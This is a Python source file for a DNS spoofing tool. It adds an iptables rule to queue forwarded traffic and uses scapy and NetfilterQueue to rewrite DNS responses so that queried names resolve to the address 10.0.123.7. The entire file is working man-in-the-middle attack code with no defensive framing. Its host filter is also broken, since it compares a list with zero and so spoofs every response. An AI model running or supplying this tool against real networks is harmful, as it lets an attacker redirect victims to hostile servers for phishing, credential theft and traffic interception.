import os
import re
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue
from termcolor import colored


class DnsSpoofer:
	def __init__(self, hosts):
		self.hosts = hosts
		self.queueNum = 65534
		self.queue = NetfilterQueue()

	def start(self):
		print(colored("[DNS] Started DNS spoofing.", "light_grey"))

		os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}")
		self.queue.bind(self.queueNum, self.spoof)

		try:
			self.queue.run()
		except KeyboardInterrupt:
			os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}")
			print(colored("[DNS] Removed IP tables rule.", "light_grey"))

	def spoof(self, packet):
		scapy_packet = IP(packet.get_payload())
		if DNSRR in scapy_packet:
			try:
				query_name = scapy_packet[DNSQR].qname.decode()

				if [i for i in self.hosts if re.search(i, query_name)] != 0:
					scapy_packet[DNS].an = DNSRR(
						rrname=query_name, rdata="10.0.123.7")
					scapy_packet[DNS].ancount = 1
					del scapy_packet[IP].len
					del scapy_packet[IP].chksum
					del scapy_packet[UDP].len
					del scapy_packet[UDP].chksum

					print(colored(f"[DNS] Spoofed packet: {scapy_packet[DNSRR].summary()}", "light_grey"))
			except IndexError as error:
				print(colored(f"[DNS] Error: {error}.", "red"))

			packet.set_payload(bytes(scapy_packet))
		return packet.accept()
